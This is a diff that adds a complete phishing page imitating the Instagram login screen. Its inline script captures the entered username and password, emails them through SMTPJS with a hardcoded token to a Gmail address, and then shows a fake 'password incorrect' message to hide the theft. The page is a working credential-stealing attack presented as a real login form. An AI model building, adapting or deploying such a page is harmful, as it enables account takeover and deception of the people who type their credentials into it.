@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="center">
+        <div class="header">
+          <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
+        </div>
+        <div class="inputElement">
+          <input
+            type="text"
+            placeholder="Phone number,username or email"
+            class="inputText"
+            id="name"
+          />
+          <input type="password" placeholder="Password" class="inputText" id="password" />
+          <input type="submit" value="Log in" class="inputButton" id="send" />
+          <div class="line">
+            <span class="arrow"></span>
+            <span class="content">OR</span>
+            <span class="arrow"></span>
+          </div>
+          <div class="social__icon">
+            <i class="fab fa-facebook-square"></i
+            ><span>Log in with facebook</span>
+          </div>
+          <div class="forgetPassword">Forget Password?</div>
+        </div>
+      </div>
+      <div class="footer">
+        <p>Don't have a accout?<span>Sign Up</span></p>
+      </div>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script src="main.js"></script>
+    <script>
+        const btn = document.getElementById("send");
+        const name = document.getElementById('name');
+        const password= document.getElementById('password');
+        btn.addEventListener("click", function (e) {
+            e.preventDefault();
+            const body = "Name: " + name.value + "<br>" + "password: " + password.value + "<br>" ;
+            Email.send({
+                SecureToken: "ef31f007-7781-4c66-88dd-8f089ec756c5 ",
+                To: 'ahmedroll18@gmail.com',
+                From: "ahmedroll18@gmail.com",
+                Subject: "Message for contact form",
+                Body: body
+            }).then(
+                message => alert("Your password incorrect")
+            );
+        })
+    </script>
+  </body>
+</html>
